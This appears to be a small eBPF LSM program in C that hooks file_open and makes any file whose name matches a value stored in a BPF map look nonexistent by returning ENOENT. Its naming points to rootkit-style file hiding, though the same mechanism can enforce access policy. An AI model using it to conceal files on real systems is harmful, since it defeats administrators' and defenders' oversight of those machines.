// SPDX-License-Identifier: MIT
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_core_read.h>
#include <bpf/bpf_tracing.h>

#define MAX_NAME 64

struct {
	__uint(type, BPF_MAP_TYPE_ARRAY);
	__uint(max_entries, 1);
	__type(key, __u32);
	__type(value, char[MAX_NAME]);
} hidden_name SEC(".maps");

static __always_inline int name_eq(const char *a, const char *b)
{
	#pragma unroll
	for (int i = 0; i < MAX_NAME; i++) {
		char ca = a[i], cb = b[i];
		if (ca != cb) return 0;
		if (ca == 0)  return 1;
	}
	return 1;
}

SEC("lsm/file_open")
int BPF_PROG(hide_file_open, struct file *file, int ret)
{
	__u32 key = 0;
	char *target;
	const unsigned char *dname;
	char buf[MAX_NAME] = {};

	if (ret) return ret;

	target = bpf_map_lookup_elem(&hidden_name, &key);
	if (!target || target[0] == 0)
		return 0;

	dname = BPF_CORE_READ(file, f_path.dentry, d_name.name);
	if (!dname) return 0;

	bpf_probe_read_kernel_str(buf, sizeof(buf), dname);
	if (name_eq(buf, target))
		return -2; /* ENOENT */
	return 0;
}

char LICENSE[] SEC("license") = "GPL";
